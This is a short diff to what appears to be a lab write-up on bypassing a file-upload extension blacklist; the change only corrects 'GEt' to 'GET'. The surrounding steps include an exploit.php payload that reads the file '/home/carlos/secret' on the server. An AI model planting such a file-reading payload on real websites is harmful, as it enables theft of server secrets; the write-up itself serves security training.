@@ -12,7 +12,7 @@ The application blocks dangerous extensions like `.php`, but the blacklist fails
 
 ## 🛠 Steps to Solve
 1. Log in and upload your image as your avatar.
-2. Send the `GEt` request `/files/avatars/<IMAGE>` to Burp Repeater.
+2. Send the `GET` request `/files/avatars/<IMAGE>` to Burp Repeater.
 3. Create an **exploit.php** file containing the script:
    ```sh
    <? php file_get_contents('/home/carlos/secret'); ?>
